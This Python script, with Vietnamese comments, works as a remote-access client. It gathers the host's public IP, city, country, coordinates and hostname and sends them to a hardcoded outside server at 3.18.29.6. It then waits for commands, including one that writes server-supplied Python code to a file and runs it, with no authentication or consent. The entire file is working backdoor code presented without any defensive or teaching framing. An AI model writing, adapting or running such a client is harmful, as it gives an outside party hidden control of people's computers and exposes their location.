import socket
import json
import os

import requests

def get_ip_info():
    response = requests.get('https://ipinfo.io')
    data = response.json()
    return {
        'ip': data.get('ip'),
        'city': data.get('city'),
        'country': data.get('country'),
        'hostname': socket.gethostname(),
        'lat': data.get('loc').split(',')[0],
        'lon': data.get('loc').split(',')[1]
    }

def run_code(code):
    # ghi code vào file
    with open('temp.py', 'w') as f:
        f.write(code)
    # chạy file
    os.system('python temp.py')
    

# Create a socket object
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to the server
server_address = ('3.18.29.6', 12345)
client_socket.connect(server_address)
ip_info = get_ip_info()
command = {
    'cmd': 'add',
    'result': {
        'name': os.name,
        'ip': ip_info['ip'],
        'city': ip_info['city'],
        'country': ip_info['country'],
        'hostname': ip_info['hostname'],
        'lat': ip_info['lat'],
        'lon': ip_info['lon']
    }
}
print(command)
json_command = json.dumps(command)
client_socket.sendall(json_command.encode())

while True:
    try:
        data = client_socket.recv(1024*1024).decode()
        json_data = json.loads(data)
        print(json_data)
        if json_data['cmd'] == 'ls_clients':
            print('List clients:', json_data['result'])
        
        if json_data['cmd'] == 'python':
            code = json_data['code']
            run_code(code)
            
        
        if json_data['cmd'] == 'ping':
            client_socket.sendall(json.dumps({
                'cmd': 'pong'
            }).encode())
        
        if json_data['cmd'] == 'exit':
            break
    except Exception as e:
        print(e)
        continue